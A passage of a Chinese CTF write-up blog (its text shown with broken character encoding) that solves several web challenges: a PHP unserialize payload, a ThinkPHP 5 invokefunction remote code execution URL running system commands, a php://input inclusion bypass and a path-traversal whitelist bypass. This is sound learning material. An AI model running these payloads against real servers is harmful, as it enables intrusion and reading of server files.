<p>æ‰€ä»¥å¼€å§‹æˆ‘æ˜¯ç›´æ¥åœ¨Då’Œfå‰åŠ ä¸Šç©ºæ ¼ï¼Œä½†æ˜¯åº•ä¸‹çš„base64ç¼–ç æäº¤urlæ²¡æœ‰ååº”</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220628214059503.png" alt="image-20220628214059503"></p>
<p>ç„¶åæŠŠdecoderæ¢æˆhexï¼Œå‘ç°ç©ºæ ¼æ˜¯20ï¼ˆ44æ˜¯å­—æ¯Dï¼Œ66æ˜¯å­—æ¯fï¼‰</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220628233504338.png" alt="image-20220628233504338"></p>
<p>ç„¶åçœ‹äº†ä¸‹é¢è¿™ä¸ªè¡¨ï¼Œæ˜ç™½00æ‰æ˜¯ç©ºå­—ç¬¦ï¼Œç©ºæ ¼å’Œç©ºå­—ç¬¦ä¸æ˜¯åŒä¸€ä¸ªä¸œè¥¿</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220628213218629.png" alt="image-20220628213218629"></p>
<p>ä½†æ˜¯ç©ºå­—ç¬¦æ— æ³•å¤åˆ¶ï¼Œåœ¨å¤åˆ¶æ—¶ï¼Œç©ºå­—ç¬¦åçš„å­—ç¬¦ä¸²ä¼šè¢«æˆªæ–­ï¼Œåªå¤åˆ¶äº†ç©ºå­—ç¬¦å‰é¢çš„å­—ç¬¦ä¸²</p>
<p>æ‰€ä»¥è¿™é‡Œå¯ä»¥åœ¨hexé‡Œç›´æ¥æ”¹ï¼ŒæŠŠ20æ”¹æˆ00</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220628233851825.png" alt="image-20220628233851825"></p>
<p>ç„¶åä¸‹æ–¹çš„base64ç¼–ç å°±å¯ä»¥äº†</p>
<p>è®¿é—®</p>
<p><code>http://111.200.241.244:50547/?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p>
<p>å¾—åˆ°flag</p>
<h2 id="7-php-rce"><a href="#7-php-rce" class="headerlink" title="7.php_rce"></a>7.php_rce</h2><h3 id="1-é¢˜ç›®æè¿°-16"><a href="#1-é¢˜ç›®æè¿°-16" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-14"><a href="#2-wp-14" class="headerlink" title="2)wp"></a>2)wp</h3><p>å¼€å§‹ç•Œé¢å¦‚ä¸‹</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220630174402928.png" alt="image-20220630174402928"></p>
<p>ï¼ˆçœ‹åˆ°thinkphpæˆ‘å°±æƒ³èµ·ä»Šå¹´å›½èµ›ä¹Ÿæœ‰ä¸€é“think PHPçš„é¢˜ï¼Œçˆ†0ï¼Œéº»äº†ï¼‰</p>
<p>è¿™é‡Œå¯ä»¥å…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯<a href="../../../../2022/05/28/Web-study">rce</a>å’Œè¯¥æ¼æ´çš„æˆå› </p>
<p>å¦‚æœè¿™é‡Œç‰ˆæœ¬çš„thinkphpå­˜åœ¨rceçš„æ¼æ´ï¼Œå°±å¯ä»¥é€šè¿‡æŒ‡ä»¤è·å–flag</p>
<p>ç™¾åº¦å¯çŸ¥</p>
<p><code>ThinkPHP 5.0&lt;5.0.23&amp;5.1&lt;5.1.31ç‰ˆæœ¬åœ¨æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…é€šè¿‡è¯¥æ¼æ´å¯èƒ½å®Œå…¨æ§åˆ¶WebæœåŠ¡å™¨ã€‚</code> </p>
<p>ç„¶ååœ¨Githubä¸Šæœthinkphpå¾—åˆ°<a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">payload</a></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220630174951670.png" alt="image-20220630174951670"></p>
<p>å°è¯•<code>http://111.200.241.244:51053/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></p>
<p>äº†è§£åˆ°æœ€åçš„idå¤„ä¸ºå‘½ä»¤æ‰§è¡Œè¯­å¥è¾“å…¥å¤„ï¼Œç”¨ findè¯­å¥æŸ¥çœ‹æœ‰æ²¡æœ‰flagæ–‡ä»¶</p>
<p><code>http://111.200.241.244:57210/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find / -name flag*</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220630175318946.png" alt="image-20220630175318946"></p>
<p>å¾—åˆ°çš„ç»“æœå¾ˆä¹±ï¼Œç”¨F12æ•´æ´ä¸€äº›</p>
<p>æœ€åè¡Œï¼Œçœ‹åˆ°flagæ–‡ä»¶å¤¹</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220630175432667.png" alt="image-20220630175432667"></p>
<p>ç”¨catæ˜¾ç¤ºå‡ºæ¥</p>
<p><code>http://111.200.241.244:57210/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code></p>
<p>å¾—åˆ°flag</p>
<h2 id="8-Web-php-include"><a href="#8-Web-php-include" class="headerlink" title="8.Web_php_include"></a>8.Web_php_include</h2><h3 id="1-é¢˜ç›®æè¿°-17"><a href="#1-é¢˜ç›®æè¿°-17" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-15"><a href="#2-wp-15" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿™é“é¢˜å…ˆäº†è§£<a href="../../../../2022/05/28/Web-study">phpä¼ªåè®®</a></p>
<p>çœ‹åå­—å¾ˆæ¸…æ¥šæ˜¯åˆ°æ–‡ä»¶åŒ…å«çš„é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;  <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>å…ˆåˆ†æä¸€ä¸‹å‡½æ•°</p>
<p><code>strstr()ï¼š</code><br><code>å®šä¹‰å’Œç”¨æ³•ï¼š</code><br><code>æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ˜¯ï¼Œè¿”å›å­—ç¬¦ä¸²åŠå‰©ä½™éƒ¨åˆ†ï¼Œå¦åˆ™è¿”å›falseã€‚</code><br><code>åŒºåˆ†å¤§å°å†™ï¼Œstristr()å‡½æ•°ä¸åŒºåˆ†å¤§å°å†™</code><br><code>è¯­æ³•ï¼š</code><br><code>strstr(string,search,before_search)</code><br><code>string:å¿…éœ€ï¼Œè¢«æœç´¢çš„å­—ç¬¦ä¸²</code><br><code>search:å¿…éœ€ï¼Œè¦æœç´¢çš„å­—ç¬¦ä¸²ï¼Œè‹¥æ˜¯æ•°å­—ï¼Œåˆ™æœç´¢å¯¹åº”çš„ASCIIå€¼çš„å­—ç¬¦</code><br><code>before_searchï¼šå¯é€‰ï¼Œé»˜è®¤ä¸ºâ€œfalseâ€ï¼Œè‹¥ä¸ºtrue,å°†è¿”å›searchå‚æ•°ç¬¬ä¸€æ¬¡å‡ºç°ä¹‹å‰çš„å­—ç¬¦ä¸²éƒ¨åˆ†</code></p>
<p><code>str_replace():</code><br><code>å®šä¹‰å’Œç”¨æ³•ï¼š</code><br><code>ä»¥å…¶å®ƒå­—ç¬¦æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</code><br><code>è¯­æ³•ï¼š</code><br><code>str_replace(find,replace,string,count)</code><br><code>find,å¿…éœ€ï¼Œè¦æŸ¥æ‰¾çš„å€¼</code><br><code>replaceï¼Œå¿…éœ€ï¼Œè¦æ›¿æ¢çš„å€¼</code><br><code>stringï¼Œå¿…éœ€ï¼Œè¢«æœç´¢çš„å­—ç¬¦ä¸²</code><br><code>countï¼Œå¯é€‰ï¼Œæ›¿æ¢æ¬¡æ•°</code></p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœpage=çš„å†…å®¹é‡Œæœ‰php://å°±ä¼šè¢«æ›¿æ¢ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯è¿‡æ»¤</p>
<p>ä½†æ˜¯çœ‹æºç æˆ‘ä»¬çŸ¥é“ï¼Œå®ƒåªè¿‡æ»¤äº†å°å†™ï¼Œæ‰€ä»¥å¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡ï¼Œè¿™é‡Œç”¨çš„php://input</p>
<p>*è¿™é“é¢˜å¥½åƒåŒ…æ‹¬php://inputï¼Œæœ‰5ç§æ–¹æ³•ï¼Œå»ºè®®çœ‹çœ‹è¿™ç¯‡æ–‡ç« <a href="https://blog.csdn.net/yingyugo/article/details/109783035?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-109783035-blog-122854291.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-109783035-blog-122854291.pc_relevant_paycolumn_v3&utm_relevant_index=1">Web_php_includeæ€»ç»“äº”ç§è§£æ³•å¤§åŒå°å¼‚</a></p>
<p><code>http://111.200.241.244:59492/?page=PHP://input</code></p>
<p>php://inputè¯»å–POSTæ•°æ®ï¼Œ æˆ‘å…ˆç”¨hackbarï¼Œå‘ç°æ²¡æœ‰ååº”</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626215410026.png" alt="image-20220626215410026"></p>
<p>çœ‹äº†ä¸€ç¯‡å¤§ä½¬çš„wpï¼Œè¯´æ˜¯è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä¸è¡Œ</p>
<p>ä½†è¿™é‡Œå¯ä»¥ç”¨burpè¯•è¯•ï¼Œå¾—åˆ°flagæ–‡ä»¶å</p>
<p>fl4gisisish3r3.php</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626222916776.png" alt="image-20220626222916776"></p>
<p>æ˜¾ç¤ºfl4gisisish3r3.phpå†…å®¹</p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220626223253399.png" alt="image-20220626223253399"></p>
<p>å¾—åˆ°flag</p>
<h2 id="9-supersqli"><a href="#9-supersqli" class="headerlink" title="9.supersqli"></a>9.supersqli</h2><h3 id="1-é¢˜ç›®æè¿°-18"><a href="#1-é¢˜ç›®æè¿°-18" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>éšä¾¿æ³¨</p>
<h3 id="2ï¼‰wp-3"><a href="#2ï¼‰wp-3" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>è¿™é“é¢˜ä¹‹å‰åœ¨buuctfä¸Šåšè¿‡ï¼Œè€ƒå¯Ÿå †å æ³¨å…¥ï¼Œwpå¯ä»¥åœ¨<a href="../../../../2022/06/21/buuctf-wp">buuctf-wp</a>çœ‹ä¸€ä¸‹</p>
<h2 id="10-warmup"><a href="#10-warmup" class="headerlink" title="10.warmup"></a>10.warmup</h2><h3 id="1-é¢˜ç›®æè¿°-19"><a href="#1-é¢˜ç›®æè¿°-19" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2ï¼‰wp-4"><a href="#2ï¼‰wp-4" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>å¼€å§‹å°±åªæœ‰ä¸€å¼ å›¾ç‰‡ï¼Œå…ˆçœ‹ä¸€ä¸‹å®ƒæºç </p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220703104834305.png" alt="image-20220703104834305"></p>
<p>çœ‹åˆ°æœ‰ä¸€ä¸ªsource.phpæ–‡ä»¶</p>
<p>è®¿é—®<code>http://111.200.241.244:59132/source.php</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="comment">//__FILE__å¸¸é‡è¿”å›æ–‡ä»¶çš„å®Œæ•´è·¯å¾„å’Œæ–‡ä»¶åï¼Œé«˜äº®æ˜¾ç¤º</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="comment">//ç™½åå•</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœä¸å­˜åœ¨ï¼ˆisset()ï¼‰æˆ–è€…ä¸ä¸ºå­—ç¬¦ä¸²ï¼ˆis_string()ï¼‰</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,//è¦æˆªå–çš„å­—ç¬¦ä¸²</span><br><span class="line">                <span class="number">0</span>,//èµ·å§‹ä½ç½®</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//æˆªå–é•¿åº¦</span><br><span class="line">                //è¿”å›ï¼Ÿåœ¨<span class="variable">$page</span>.?å­—ç¬¦ä¸²ä¸­å‡ºç°çš„ä½ç½®</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);<span class="comment">//è§£ç </span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,//è¦æˆªå–çš„å­—ç¬¦ä¸²</span><br><span class="line">                <span class="number">0</span>,//èµ·å§‹ä½ç½®</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//æˆªå–é•¿åº¦</span><br><span class="line">                //è¿”å›ï¼Ÿåœ¨<span class="variable">$_page</span>å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">    <span class="comment">//å¦‚æœä¼ çš„å‚æ•°ä¸æ˜¯ç©ºçš„ï¼Œå¹¶ä¸”æ˜¯å­—ç¬¦ä¸²ï¼Œè°ƒç”¨checkFileå‡½æ•°è¿”å›ä¸ºtrue</span></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="comment">//å¯¹ä¼ æ¥çš„å‚æ•°è¿›è¡ŒåŒ…å«</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">        <span class="comment">//å¦åˆ™å°±è¾“å‡ºå›¾ç‰‡</span></span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>æ²¡æœ‰flagçš„çº¿ç´¢ï¼Œä½†çœ‹åˆ°ä¸€ä¸ªhint.phpæ–‡ä»¶</p>
<p>è®¿é—®<code>http://111.200.241.244:59132/hint.php</code></p>
<p><img src="/2022/06/21/Gongfang-wp/image-20220703105453437.png" alt="image-20220703105453437"></p>
<p>çŸ¥é“äº†flagåœ¨ffffllllaaaaggggæ–‡ä»¶é‡Œ</p>
<p>ç„¶åå¼€å§‹åˆ†æsource.phpä»£ç ï¼ˆå¯ä»¥çœ‹çœ‹æºç æ³¨é‡Šï¼‰</p>
<p>åˆ†æï¼š</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå…³é”®åœ¨äº checkfile å‡½æ•°ï¼Œè¦è®©å®ƒè¿”å›ä¸ºtureæ‰èƒ½å¤Ÿå®ç°æ–‡ä»¶åŒ…å«ï¼Œæˆ‘ä»¬èƒ½æ§åˆ¶çš„å˜é‡æ˜¯fileï¼Œ<u>pageå˜é‡å®é™…æ˜¯fileå˜é‡çš„å½¢å‚ï¼Œç”±checkfileå‡½æ•°ä¼ è¿‡å»</u>ï¼Œä¹Ÿå°±æ˜¯fileå˜é‡è¦æ»¡è¶³æ‰€æœ‰çš„ifæ¡ä»¶ï¼Œæ‰èƒ½è¿”å›tureè€Œä¸æ˜¯åªæ˜¾ç¤ºå›¾ç‰‡</p>
<p>å…ˆåˆ†æcheckfileå‡½æ•°é‡Œçš„å››ä¸ªifæ¡ä»¶æ»¡è¶³è¦æ±‚ï¼Œé¿å…æ‰§è¡Œreturn false</p>
<p>ç¬¬ä¸€ä¸ªif</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœä¸å­˜åœ¨ï¼ˆisset()ï¼‰æˆ–è€…ä¸ä¸ºå­—ç¬¦ä¸²ï¼ˆis_string()ï¼‰</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>

<p>å› ä¸ºè¯­å¥é‡Œå­˜åœ¨return falseï¼Œæ‰€ä»¥è¦ä¼ å…¥çš„<u>å˜é‡pageå­˜åœ¨ä¸”ä¸ºå­—ç¬¦ä¸²</u>ï¼Œä½¿å¾—ifè¯­å¥ä¸ºå‡ï¼Œå°±ä¸ä¼šæ‰§è¡Œreturn falseï¼Œè¿™ä¸ªæœ¬èº«å°±æ»¡è¶³ï¼Œæ‰€ä»¥å¯ä»¥ä¸è€ƒè™‘</p>
<p>ç¬¬äºŒä¸ªif</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line"><span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¦æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°æ˜¯source.phpæˆ–è€…hint.phpï¼Œæ»¡è¶³whitelist(ç™½åå•)ï¼Œå¦‚æœè¿˜ä¸æ»¡è¶³ç»§ç»­å¾€ä¸‹åˆ¤æ–­ï¼Œæ»¡è¶³å°±è·³å‡ºcheckfileå‡½æ•°</p>
<p>ç¬¬ä¸‰ä¸ªifï¼Œç»“åˆå…¶å‰é¢ä»£ç </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">               <span class="variable">$page</span>,//è¦æˆªå–çš„å­—ç¬¦ä¸²</span><br><span class="line">               <span class="number">0</span>,//èµ·å§‹ä½ç½®</span><br><span class="line">               <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//æˆªå–é•¿åº¦</span><br><span class="line">               //è¿”å›ï¼Ÿåœ¨<span class="variable">$page</span>.?å­—ç¬¦ä¸²ä¸­å‡ºç°çš„ä½ç½®</span><br><span class="line">           );</span><br><span class="line">           <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">           <span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure></div>

<p>å–ä¼ å…¥pageå‚æ•°é¦–æ¬¡å‡ºç°?å‰çš„éƒ¨åˆ†ï¼Œå†è¿›è¡Œç™½åå•åˆ¤æ–­ï¼Œå³æ˜¯å¦å­˜åœ¨source.phpæˆ–è€…hint.phpï¼Œå¦‚æœè¿˜ä¸æ»¡è¶³ç»§ç»­å¾€ä¸‹åˆ¤æ–­ï¼Œæ»¡è¶³å°±è·³å‡ºcheckfileå‡½æ•°</p>
<p>ç¬¬å››ä¸ªif</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);<span class="comment">//è§£ç </span></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,//è¦æˆªå–çš„å­—ç¬¦ä¸²</span><br><span class="line">                <span class="number">0</span>,//èµ·å§‹ä½ç½®</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//æˆªå–é•¿åº¦</span><br><span class="line">                //è¿”å›ï¼Ÿåœ¨<span class="variable">$_page</span>å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="comment">//å¦‚æœåœ¨ç™½åå•é‡Œ</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div>

<p>å…ˆæŠŠå‚æ•°è¿›è¡Œurlè§£ç ï¼Œç„¶åå’Œç¬¬ä¸‰ä¸ªifä¸€æ ·ï¼Œå–ä¼ å…¥pageå‚æ•°é¦–æ¬¡å‡ºç°?å‰çš„éƒ¨åˆ†ï¼Œå†è¿›è¡Œç™½åå•åˆ¤æ–­ï¼Œå³æ˜¯å¦å­˜åœ¨source.phpæˆ–è€…hint.phpï¼Œå¦‚æœè¿˜ä¸æ»¡è¶³ç»§ç»­å¾€ä¸‹åˆ¤æ–­ï¼Œæ»¡è¶³å°±è·³å‡ºcheckfileå‡½æ•°</p>
<hr>
<p>è‡³äº</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br></pre></td></tr></table></figure></div>

<p>åªè¦fileä¸ä¸ºç©ºï¼Œä¸”ä¸ºå­—ç¬¦ä¸²å³å¯ï¼Œå¯ä»¥æ»¡è¶³ä¸è€ƒè™‘</p>
<p>æ‰€ä»¥åªæœ‰ä¸‹é¢ä¸¤ç§</p>
<p><code>http://111.200.241.244:59132/source.php?file=source.php?(payload)</code></p>
<p><code>http://111.200.241.244:59132/source.php?file=hint.php?(payload)</code></p>
<p>ç”±PHP4-7çš„includeå‡½æ•°çš„ç‰¹æ€§</p>
<p><img src="https://img-blog.csdnimg.cn/20200319173934886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l5Ynp6eg==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>åœ¨payloadä¸ŠåŠ ä¸Š<code>/../../../../../../ffffllllaaaagggg</code>ï¼Œè¿™é‡Œå¯åªåŠ å››å±‚../å³å¯ï¼Œä½†ä¹Ÿå¯ä»¥åŠ å¤šä¸ªè¿”å›ä¸Šä¸ªç›®å½•ï¼Œä¹Ÿå¯ä»¥ä¾æ¬¡è¯•è¯•</p>
<p>å¾—åˆ°flag</p>
<p><strong>è¡¥å……</strong></p>
